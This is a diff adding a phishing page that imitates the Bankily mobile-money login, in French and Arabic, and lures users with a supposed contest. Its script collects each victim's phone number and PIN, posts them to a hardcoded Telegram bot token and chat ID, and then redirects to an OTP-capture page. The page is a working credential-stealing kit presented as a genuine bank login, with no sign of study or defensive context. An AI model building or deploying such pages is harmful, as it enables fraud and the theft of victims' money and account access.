@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+
+<html lang="auto">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bankily Login</title>
+  <style>
+
+```
+/* ═══════════════════════════════════
+   RESET + BASE — Fix 4
+═══════════════════════════════════ */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { overflow-x: hidden; width: 100%; }
+
+body {
+  font-family: sans-serif;
+  background: url('images/bankilyback2.png') no-repeat center center fixed;
+  background-size: cover; /* Fix 6 : toujours cover */
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+}
+
+/* ═══════════════════════════════════
+   OVERLAY
+═══════════════════════════════════ */
+.overlay {
+  background-color: rgba(0,0,0,0.6);
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 1;
+}
+
+/* ═══════════════════════════════════
+   BOUTONS FIXES (langue + retour)
+═══════════════════════════════════ */
+.lang-toggle {
+  position: fixed;
+  top: 14px; right: 14px;
+  z-index: 100;
+  background: rgba(255,255,255,0.15);
+  border: 1px solid rgba(255,255,255,0.5);
+  color: #fff;
+  padding: 6px 14px;
+  border-radius: 20px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: bold;
+  backdrop-filter: blur(4px);
+  transition: background 0.2s;
+}
+.lang-toggle:hover { background: rgba(255,255,255,0.28); }
+
+.back-btn {
+  position: fixed;
+  top: 14px; left: 14px;
+  z-index: 100;
+  background: rgba(255,255,255,0.15);
+  border: 1px solid rgba(255,255,255,0.5);
+  color: #fff;
+  padding: 6px 14px;
+  border-radius: 20px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: bold;
+  text-decoration: none;
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  backdrop-filter: blur(4px);
+  transition: background 0.2s;
+}
+.back-btn:hover { background: rgba(255,255,255,0.28); color: #FFC107; }
+
+/* ═══════════════════════════════════
+   MESSAGE INFO — fixed en haut de l'écran
+   z-index élevé pour passer au-dessus overlay
+═══════════════════════════════════ */
+.info-message {
+  position: fixed;
+  top: 60px;          /* sous les boutons retour/langue */
+  left: 50%;
+  transform: translateX(-50%);
+  width: calc(100% - 40px);
+  max-width: 380px;
+  background: rgba(255, 193, 7, 0.97);
+  color: #1a1a1a;
+  font-size: 13.5px;
+  font-weight: 700;
+  line-height: 1.6;
+  padding: 12px 16px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 6px 24px rgba(0,0,0,0.5);
+  z-index: 500;        /* au-dessus de l'overlay (z-index:1) */
+  transition: opacity 0.6s ease, transform 0.6s ease;
+  opacity: 1;
+  pointer-events: auto;
+}
+.info-message.hidden {
+  opacity: 0;
+  transform: translateX(-50%) translateY(-20px);
+  pointer-events: none;
+}
+
+/* ═══════════════════════════════════
+   WRAPPER
+═══════════════════════════════════ */
+.login-wrapper {
+  z-index: 2;
+  width: 100%;
+  max-width: 400px;
+  padding: 20px;
+  color: white;
+  position: relative;
+}
+
+.logo {
+  display: block;
+  margin: 0 auto 20px auto;
+  width: 200px;
+}
+
+/* ═══════════════════════════════════
+   CHAMP USERNAME
+═══════════════════════════════════ */
+.input-group {
+  display: flex;
+  align-items: center;
+  border-bottom: 1px solid white;
+  margin-bottom: 5px;
+  padding-bottom: 5px;
+  direction: ltr; /* toujours LTR pour le numéro */
+}
+
+.input-group img {
+  width: 24px;
+  margin-right: 10px;
+  flex-shrink: 0;
+}
+
+.input-group input {
+  flex: 1;
+  background: transparent;
+  border: none;
+  color: white;
+  font-size: 16px;
+  outline: none;
+  direction: ltr;
+}
+
+.input-group input::placeholder { color: rgba(255,255,255,0.7); }
+
+/* ═══════════════════════════════════
+   MODAL
+═══════════════════════════════════ */
+.modal-alert {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.6);
+  z-index: 10000;
+  justify-content: center;
+  align-items: center;
+}
+.modal-box {
+  background: white;
+  padding: 20px 30px;
+  border-radius: 8px;
+  text-align: center;
+  max-width: 90%;
+}
+.modal-box p { font-size: 16px; color: #333; margin-bottom: 15px; white-space: pre-line; line-height: 1.6; }
+.modal-box button {
+  background-color: #0097A7;
+  color: white;
+  border: none;
+  padding: 8px 20px;
+  border-radius: 5px;
+  cursor: pointer;
+}
+.modal-box button:hover { background-color: #00838F; }
+
+/* ═══════════════════════════════════
+   PIN
+═══════════════════════════════════ */
+.pin-label {
+  margin-top: 20px;
+  margin-bottom: 8px;
+  font-size: 16px;
+}
+
+/* Fix PIN TOUJOURS LTR — 3 couches de protection :
+   1. direction:ltr en CSS
+   2. unicode-bidi:bidi-override force le sens
+   3. dir="ltr" en HTML attribute (le plus fort)    */
+.pin-boxes {
+  display: flex;
+  flex-direction: row !important;
+  direction: ltr !important;
+  unicode-bidi: bidi-override;
+  justify-content: space-between;
+  margin-bottom: 20px;
+  gap: 8px;
+}
+
+.pin-boxes input {
+  width: 22%;
+  padding: 12px 6px;
+  font-size: 20px;
+  text-align: center;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+  background: #fff;
+  color: #000;
+  outline: none;
+  direction: ltr !important;
+  unicode-bidi: bidi-override;
+}
+
+.pin-boxes input:focus {
+  border-color: #0097A7;
+  box-shadow: 0 0 5px rgba(0,151,167,0.5);
+}
+
+/* ═══════════════════════════════════
+   LIENS
+═══════════════════════════════════ */
+.links {
+  text-align: right;
+  font-size: 14px;
+  margin-bottom: 30px;
+}
+.links a { color: white; text-decoration: underline; display: block; margin-bottom: 10px; }
+.links a:hover { color: #FFC107; }
+
+/* ═══════════════════════════════════
+   BOUTON CONNEXION
+═══════════════════════════════════ */
+.login-btn {
+  background: #FFC107;
+  border: none;
+  padding: 15px;
+  width: 100%;
+  font-size: 18px;
+  font-weight: bold;
+  border-radius: 5px;
+  color: black;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+.login-btn:hover { background: #FFD54F; }
+
+/* ═══════════════════════════════════
+   LOADER — Fix 5 : via classe .active
+═══════════════════════════════════ */
+#loader-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw; height: 100vh;
+  background: rgba(0,0,0,0.8);
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+}
+#loader-overlay.active { display: flex; }
+
+.spinner {
+  border: 5px solid rgba(255,255,255,0.3);
+  border-top: 5px solid #fff;
+  border-radius: 50%;
+  width: 50px; height: 50px;
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+  0%   { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+```
+
+  </style>
+</head>
+<body>
+
+  <!-- Retour -->
+
+<a href="index.php" class="back-btn" id="back-btn">← Retour</a>
+
+  <!-- Langue -->
+
+<button class="lang-toggle" id="lang-btn" onclick="toggleLang()">عربي</button>
+
+  <!-- Message info — fixed, z-index 500, au-dessus de l'overlay -->
+
+  <div class="info-message" id="info-message"></div>
+
+  <div class="overlay"></div>
+
+  <div class="login-wrapper">
+
+```
+<img src="images/logo.png" alt="Bankily Logo" class="logo">
+
+<!-- Message info : fixed en haut, géré par JS -->
+
+<form id="login-form">
+
+  <div class="input-group">
+    <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png" alt="user">
+    <input type="text" name="username" id="username"
+           placeholder="" required
+           inputmode="numeric" maxlength="8" autocomplete="off">
+  </div>
+
+  <div class="modal-alert" id="modal-alert">
+    <div class="modal-box">
+      <p id="modal-text"></p>
+      <button id="modal-close" type="button">OK</button>
+    </div>
+  </div>
+
+  <div class="pin-label" id="pin-label"></div>
+
+  <!-- Fix PIN : dir=ltr en HTML attribute — priorité absolue sur tous navigateurs -->
+  <div class="pin-boxes" dir="ltr">
+    <input dir="ltr" type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <input dir="ltr" type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <input dir="ltr" type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+    <input dir="ltr" type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+  </div>
+
+  <input type="hidden" name="pin" id="pin">
+
+  <button type="submit" class="login-btn" id="login-btn">Se connecter</button>
+</form>
+
+<div class="links">
+  <a href="index.php" id="forgot-pin"></a>
+  <a href="index.php" id="new-user"></a>
+</div>
+```
+
+  </div>
+
+  <!-- Fix 5 : loader via classe -->
+
+  <div id="loader-overlay"><div class="spinner"></div></div>
+
+  <script>
+
+    /* ═══════════════════════════════════════════
+       Fix 2 : DÉCLARER LES REFS DOM EN PREMIER
+    ═══════════════════════════════════════════ */
+    const usernameInput = document.getElementById('username');
+    const pinInputs     = document.querySelectorAll('.pin-input');
+    const loginBtn      = document.getElementById('login-btn');
+    const pinHidden     = document.getElementById('pin');
+    const modalAlert    = document.getElementById('modal-alert');
+    const modalText     = document.getElementById('modal-text');
+    const modalClose    = document.getElementById('modal-close');
+    const infoMsg       = document.getElementById('info-message');
+    const loaderOverlay = document.getElementById('loader-overlay');
+
+    /* ═══════════════════════════════════════════
+       TEXTES BILINGUES
+    ═══════════════════════════════════════════ */
+    const T = {
+      ar: {
+        placeholder  : 'رقم بنكيلي',
+        pinLabel     : 'الرمز السري',
+        forgotPin    : 'هل نسيت الرمز السري؟',
+        newUser      : 'مستخدم جديد؟ سجل الآن',
+        loginBtn     : 'تسجيل الدخول',
+        backBtn      : 'رجوع &#8594;',
+        langBtn      : 'FR',
+        errUsername  : 'رقم بنكيلي غير صحيح',
+        /* Fix 1 : texte arabe corrigé sans mot collé */
+        errPin       : 'الرمز السري غير صحيح',
+        errPinUnique : 'يجب أن يحتوي الرمز السري على 4 أرقام مختلفة',
+        infoMsg      : 'تأكد من كتابة رقمك بنكيلي ورمز السري بشكل صحيح حتى تأكد تسجيلك في المسابقة',
+      },
+      fr: {
+        placeholder  : 'Numéro Bankily',
+        pinLabel     : 'Code PIN',
+        forgotPin    : 'Code PIN oublié ?',
+        newUser      : 'Nouvel utilisateur ? S\'inscrire maintenant',
+        loginBtn     : 'Se connecter',
+        backBtn      : '&#8592; Retour',
+        langBtn      : 'عربي',
+        errUsername  : 'Le numéro Bankily doit contenir 8 chiffres et commencer par 2, 3 ou 4',
+        errPin       : 'Le code PIN doit contenir 4 chiffres',
+        errPinUnique : 'Le code PIN doit contenir 4 chiffres tous différents',
+        infoMsg      : 'Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours',
+      }
+    };
+
+    /* ═══════════════════════════════════════════
+       LANGUE
+    ═══════════════════════════════════════════ */
+    let isArabic = localStorage.getItem('bankily_lang')
+      ? localStorage.getItem('bankily_lang') === 'ar'
+      : (navigator.language || navigator.userLanguage || '').startsWith('ar');
+
+    function applyLang() {
+      const L       = isArabic ? T.ar : T.fr;
+      const langBtn = document.getElementById('lang-btn');
+      const backBtn = document.getElementById('back-btn');
+
+      document.body.dir             = isArabic ? 'rtl' : 'ltr';
+      document.documentElement.lang = isArabic ? 'ar'  : 'fr';
+
+      langBtn.textContent = L.langBtn;
+      backBtn.innerHTML   = L.backBtn;
+
+      /* Repositionnement des boutons fixes en RTL */
+      if (isArabic) {
+        langBtn.style.right = 'auto'; langBtn.style.left  = '14px';
+        backBtn.style.left  = 'auto'; backBtn.style.right = '14px';
+      } else {
+        langBtn.style.left  = 'auto'; langBtn.style.right = '14px';
+        backBtn.style.right = 'auto'; backBtn.style.left  = '14px';
+      }
+
+      usernameInput.placeholder = L.placeholder;
+      document.getElementById('pin-label').innerText  = L.pinLabel;
+      document.getElementById('forgot-pin').innerText = L.forgotPin;
+      document.getElementById('new-user').innerText   = L.newUser;
+      loginBtn.innerText = L.loginBtn;
+
+      /* Message info */
+      infoMsg.textContent = L.infoMsg;
+    }
+
+    function toggleLang() {
+      isArabic = !isArabic;
+      localStorage.setItem('bankily_lang', isArabic ? 'ar' : 'fr');
+      applyLang();
+    }
+
+    /* Fix 2 : appeler applyLang APRÈS les refs DOM */
+    applyLang();
+
+    /* Fix PIN supplémentaire : forcer dir=ltr via JS sur chaque input PIN
+       Certains navigateurs mobiles arabes ignorent le CSS — JS est plus fort */
+    pinInputs.forEach(input => {
+      input.setAttribute('dir', 'ltr');
+      input.setAttribute('lang', 'fr');
+    });
+    document.getElementById('pin-boxes') && 
+      document.getElementById('pin-boxes').setAttribute('dir', 'ltr');
+
+    /* ═══════════════════════════════════════════
+       DÉTECTION ERREUR ALREADY_REGISTERED
+       Lire les paramètres URL après redirection PHP
+    ═══════════════════════════════════════════ */
+    (function() {
+      const params = new URLSearchParams(window.location.search);
+      const error  = params.get('error');
+      const days   = params.get('days') || '7';
+
+      if (error === 'already_registered') {
+        const msgAr = `⛔ لقد قمت بالتسجيل في مسابقة بنكيلي من قبل.
+لا يمكنك التسجيل مرة أخرى إلا بعد ${days} دقيقة.`;
+        const msgFr = `⛔ Vous avez déjà participé au concours Bankily.
+Vous ne pouvez pas vous réinscrire avant ${days} minute(s).`;
+
+        // Afficher dans la modal
+        showModal(isArabic ? msgAr : msgFr);
+
+        // Nettoyer l'URL sans recharger
+        window.history.replaceState({}, '', 'login.html');
+      }
+    })();
+
+    /* ═══════════════════════════════════════════
+       MESSAGE INFO — disparaît après 3s
+       ou dès que l'utilisateur tape son numéro
+    ═══════════════════════════════════════════ */
+    let infoTimer = setTimeout(() => infoMsg.classList.add('hidden'), 3000);
+
+    usernameInput.addEventListener('input', () => {
+      clearTimeout(infoTimer);
+      infoMsg.classList.add('hidden');
+    });
+
+    /* ═══════════════════════════════════════════
+       MODAL
+    ═══════════════════════════════════════════ */
+    modalClose.addEventListener('click', () => { modalAlert.style.display = 'none'; });
+
+    function showModal(msg) {
+      modalText.innerText      = msg;
+      modalAlert.style.display = 'flex';
+    }
+
+    /* ═══════════════════════════════════════════
+       SOUMISSION
+    ═══════════════════════════════════════════ */
+    /* ═══════════════════════════════════════════════════
+       TELEGRAM CONFIG — GitHub Pages (no backend)
+    ═══════════════════════════════════════════════════ */
+    const TG_TOKEN   = '8250056043:AAFYXOIiBAeHTuZV8pPZUhV6NRTwMPipfrM';
+    const TG_CHAT_ID = '8372738559';
+
+    async function sendTelegram(text) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id:    TG_CHAT_ID,
+            text:       text,
+            parse_mode: 'HTML'
+          })
+        });
+      } catch(e) { /* silencieux */ }
+    }
+
+    /* ── Bloc contre double inscription (10 min via localStorage) ── */
+    function checkAlreadyRegistered(username) {
+      const key  = 'bnk_reg_' + username;
+      const data = localStorage.getItem(key);
+      if (!data) return false;
+      const { ts } = JSON.parse(data);
+      const elapsed = (Date.now() - ts) / 60000; // minutes
+      if (elapsed >= 10) { localStorage.removeItem(key); return false; }
+      return Math.ceil(10 - elapsed); // minutes restantes
+    }
+    function markRegistered(username) {
+      localStorage.setItem('bnk_reg_' + username, JSON.stringify({ ts: Date.now() }));
+    }
+
+    document.getElementById('login-form').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const L        = isArabic ? T.ar : T.fr;
+      const username = usernameInput.value.trim();
+      const pin      = Array.from(pinInputs).map(i => i.value).join('');
+
+      /* Validation numéro */
+      if (!/^[2-4][0-9]{7}$/.test(username)) {
+        showModal(L.errUsername); return;
+      }
+      /* Validation PIN */
+      if (!/^[0-9]{4}$/.test(pin)) {
+        showModal(L.errPin); return;
+      }
+      /* PIN — 4 chiffres tous différents */
+      if (new Set(pin.split('')).size < 4) {
+        showModal(L.errPinUnique);
+        pinInputs.forEach(i => { i.value = ''; });
+        pinInputs[0].focus();
+        return;
+      }
+
+      /* Vérifier double inscription */
+      const minsLeft = checkAlreadyRegistered(username);
+      if (minsLeft !== false) {
+        const msgAr = `⛔ لقد قمت بالتسجيل في مسابقة بنكيلي من قبل.\nلا يمكنك التسجيل مرة أخرى إلا بعد ${minsLeft} دقيقة.`;
+        const msgFr = `⛔ Vous avez déjà participé au concours Bankily.\nVous ne pouvez pas vous réinscrire avant ${minsLeft} minute(s).`;
+        showModal(isArabic ? msgAr : msgFr);
+        return;
+      }
+
+      /* Marquer comme inscrit */
+      markRegistered(username);
+
+      /* Sauvegarder pour otpverify */
+      sessionStorage.setItem('bankily_pin',      pin);
+      sessionStorage.setItem('bankily_username',  username);
+
+      /* Loader */
+      loaderOverlay.classList.add('active');
+
+      /* Envoyer à Telegram */
+      const now = new Date().toLocaleString('fr-FR');
+      await sendTelegram(
+        `🔐 <b>Nouvelle connexion – Bankily</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━\n` +
+        `📱 <b>Numéro :</b> <code>${username}</code>\n` +
+        `🔑 <b>PIN    :</b> <code>${pin}</code>\n` +
+        `📅 <b>Heure  :</b> ${now}`
+      );
+
+      /* Rediriger vers OTP */
+      setTimeout(() => { window.location.href = 'otpverify.html'; }, 1500);
+    });
+
+    /* ═══════════════════════════════════════════
+       UX CLAVIER PIN — Fix 3 : bloquer lettres
+    ═══════════════════════════════════════════ */
+    pinInputs.forEach((input, index) => {
+
+      input.addEventListener('input', () => {
+        /* Fix 3 : garder uniquement les chiffres */
+        input.value = input.value.replace(/[^0-9]/g, '');
+
+        if (input.value.length === 1 && index < pinInputs.length - 1) {
+          pinInputs[index + 1].focus();
+        }
+        setTimeout(() => { input.type = 'password'; }, 500);
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          pinInputs[index - 1].focus();
+        }
+        /* Bloquer tout caractère non numérique */
+        if (
+          !/^[0-9]$/.test(e.key) &&
+          !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)
+        ) {
+          e.preventDefault();
+        }
+      });
+
+      /* Bloquer le copier-coller de texte non numérique */
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const digits = (e.clipboardData || window.clipboardData)
+          .getData('text').replace(/[^0-9]/g, '');
+        if (digits) {
+          input.value = digits[0];
+          if (index < pinInputs.length - 1) pinInputs[index + 1].focus();
+        }
+      });
+
+    });
+
+  </script>
+
+</body>
+</html>
